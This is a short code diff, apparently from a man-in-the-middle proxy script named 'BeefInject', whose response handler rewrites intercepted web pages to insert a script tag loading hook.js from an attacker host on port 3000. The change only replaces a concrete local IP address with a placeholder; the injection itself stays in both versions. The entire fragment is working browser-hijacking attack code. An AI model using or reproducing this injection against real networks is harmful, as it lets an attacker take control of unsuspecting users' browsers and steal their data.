@@ -9,7 +9,7 @@ function onResponse(req, res) {
     log( "BeefInject loaded." );
             res.Body = body.replace(
                 '</body>',
-                '<script type="text/javascript" src="http://192.168.79.134:3000/hook.js"></script></body>'
+                '<script type="text/javascript" src="http://ipadress:3000/hook.js"></script></body>'
             );       
         }
     }
